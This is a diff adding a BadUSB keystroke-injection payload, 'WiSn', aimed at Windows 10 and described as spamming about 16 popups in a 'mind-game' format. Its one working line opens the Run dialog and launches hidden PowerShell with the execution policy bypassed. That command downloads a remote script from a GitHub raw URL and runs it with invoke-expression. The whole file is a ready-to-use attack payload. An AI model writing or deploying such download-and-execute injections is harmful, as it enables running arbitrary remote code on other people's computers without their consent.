@@ -1,0 +1,16 @@
+REM     Title: WiSn
+
+REM     Author: Josh10111
+
+REM     Description: Payload is meant to spam ~16 popups in a mind-game format
+
+REM     Target: Windows 10
+
+REM     --------------------------------------------------------------------------------------
+REM     Plug in and Execute
+REM     --------------------------------------------------------------------------------------
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/josh10111/BadUSB-PopupSpamGame/main/PopupSpamGame.ps1?dl=1; invoke-expression $pl
+ENTER
